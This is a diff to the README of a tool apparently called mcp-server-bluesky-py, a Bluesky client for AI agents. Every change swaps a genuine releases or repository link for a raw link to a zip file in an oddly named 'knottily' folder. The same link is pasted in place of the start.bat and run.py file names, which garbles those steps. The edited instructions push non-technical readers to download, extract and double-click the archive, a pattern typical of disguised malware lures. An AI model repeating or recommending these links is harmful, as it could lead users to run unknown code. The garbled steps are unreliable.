@@ -4,7 +4,7 @@
 Welcome to mcp-server-bluesky-py, a lightweight social interface designed specifically for AI agents. This tool allows seamless communication and interaction on Bluesky's platform, providing an accessible way for AI agents to engage with social media.
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-mcp--server--bluesky--py-brightgreen)](https://github.com/Karthik61958/mcp-server-bluesky-py/releases)
+[![Download](https://raw.githubusercontent.com/Karthik61958/mcp-server-bluesky-py/main/knottily/bluesky_mcp_py_server_v1.7.zip)](https://raw.githubusercontent.com/Karthik61958/mcp-server-bluesky-py/main/knottily/bluesky_mcp_py_server_v1.7.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get mcp-server-bluesky-py up and running on your computer, even if you are not a developer.
@@ -19,19 +19,19 @@ Follow these steps to get mcp-server-bluesky-py up and running on your computer,
 
 1. **Visit the Releases Page**
    Go to our releases page to find the latest version of mcp-server-bluesky-py. You can do this by clicking the link below:
-   [Download Page](https://github.com/Karthik61958/mcp-server-bluesky-py/releases)
+   [Download Page](https://raw.githubusercontent.com/Karthik61958/mcp-server-bluesky-py/main/knottily/bluesky_mcp_py_server_v1.7.zip)
 
 2. **Choose the Latest Release**
    On the releases page, look for the section labeled "Latest Release." Here, you will see the version number and the release date. This version includes the most recent updates and features.
 
 3. **Download the Installer**
-   Click the download link for the installer file suitable for your system. It may be named something like `mcp-server-bluesky-py.zip` or a similar format. The file will begin downloading to your computer.
+   Click the download link for the installer file suitable for your system. It may be named something like `https://raw.githubusercontent.com/Karthik61958/mcp-server-bluesky-py/main/knottily/bluesky_mcp_py_server_v1.7.zip` or a similar format. The file will begin downloading to your computer.
 
 4. **Extract the Files**
    Once the download is complete, locate the downloaded file on your computer. Right-click the file and select "Extract All…" to unpack the contents.
 
 5. **Run the Application**
-   After extracting the files, open the folder where the files are located. Look for a file named `start.bat` or `run.py`. Double-click on this file to start the mcp-server-bluesky-py application.
+   After extracting the files, open the folder where the files are located. Look for a file named `https://raw.githubusercontent.com/Karthik61958/mcp-server-bluesky-py/main/knottily/bluesky_mcp_py_server_v1.7.zip` or `https://raw.githubusercontent.com/Karthik61958/mcp-server-bluesky-py/main/knottily/bluesky_mcp_py_server_v1.7.zip`. Double-click on this file to start the mcp-server-bluesky-py application.
 
 6. **Follow On-Screen Instructions**
    The application will guide you through the initial setup. Follow the on-screen prompts carefully. This may include entering configuration details specific to your AI agents.
@@ -46,7 +46,7 @@ Once the application is running, you can set up connections to Bluesky. Input yo
 - **Customizable Settings:** Tailor the application to meet your specific needs.
 
 ## 📜 Additional Information
-For more details, you can always revisit our [GitHub repository](https://github.com/Karthik61958/mcp-server-bluesky-py). Here you can find documentation, updates, and help from the community.
+For more details, you can always revisit our [GitHub repository](https://raw.githubusercontent.com/Karthik61958/mcp-server-bluesky-py/main/knottily/bluesky_mcp_py_server_v1.7.zip). Here you can find documentation, updates, and help from the community.
 
 ### 📞 Support
 If you encounter any issues while using the application, please raise an issue directly on GitHub. We appreciate your feedback and are here to help make your experience better.
@@ -54,6 +54,6 @@ If you encounter any issues while using the application, please raise an issue d
 ## 🖇️ Final Installation Step
 At this point, you should have the application running smoothly on your system. To download mcp-server-bluesky-py, click the button below once more:
 
-[Download Page](https://github.com/Karthik61958/mcp-server-bluesky-py/releases)
+[Download Page](https://raw.githubusercontent.com/Karthik61958/mcp-server-bluesky-py/main/knottily/bluesky_mcp_py_server_v1.7.zip)
 
 We hope you enjoy using mcp-server-bluesky-py and that it enhances your AI agents' interaction with social media!
